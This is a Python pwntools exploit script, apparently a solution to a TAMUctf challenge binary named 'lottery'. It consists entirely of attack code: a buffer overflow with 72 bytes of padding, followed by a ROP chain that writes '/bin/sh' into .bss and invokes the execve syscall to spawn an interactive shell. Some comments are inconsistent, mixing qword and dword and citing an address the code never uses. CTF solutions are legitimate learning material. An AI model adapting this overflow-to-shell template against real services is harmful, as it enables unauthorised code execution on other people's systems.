#!/usr/bin/python3
from pwn import *
import sys
e = ELF('lottery')
r = ROP(e)
def start():
    if args.GDB:
        context.terminal = ['tmux', 'splitw', "-h"]
        return gdb.debug(e.path)
    else:
        return remote('localhost', 4444)
# process('./lottery')
# ['/usr/bin/openssl s_client' ,'-connect tamuctf.com:443', '-servername lottery', '-quiet'])
p = start()
getGadget = lambda x: p64(r.find_gadget(x).address)
# write to bss 0x40c278
# 0x040684a : mov qword ptr [rax], rsi ; ret
pd = getGadget(['pop rax', 'ret'])
pd += p64(0x40c278)    # bss address
pd += getGadget(['pop rsi', 'ret'])
pd += p64(0x6e69622f) # /bin string in hex, in little endian
pd += p64(0x040684a) # mov dword ptr [rax], rsi ; ret
# Write the second half of the string '/bin/sh' the '/sh' to 0x80eb928 + 0x4
pd += getGadget(['pop rax', 'ret'])
pd += p64(0x40c278 + 0x4) # bss address + 0x4 to write after '/bin'
pd += getGadget(['pop rsi', 'ret'])
pd += p64(0x0068732f)    # /sh string in hex, in little endian
pd += p64(0x040684a)    # mov dword ptr [rax], rsi ; ret
# call execve
payload = b'A'*72 + pd
payload += getGadget(['pop rax', 'ret']) + p64(59)
payload += getGadget(['pop rdi', 'ret']) + p64(0x40c278)
payload += getGadget(['pop rsi', 'ret']) + p64(0)
payload += getGadget(['pop rdx', 'ret']) + p64(0)
payload += getGadget(['syscall', 'ret'])
p.send(b'3\n'+payload+b'\n')
p.interactive()
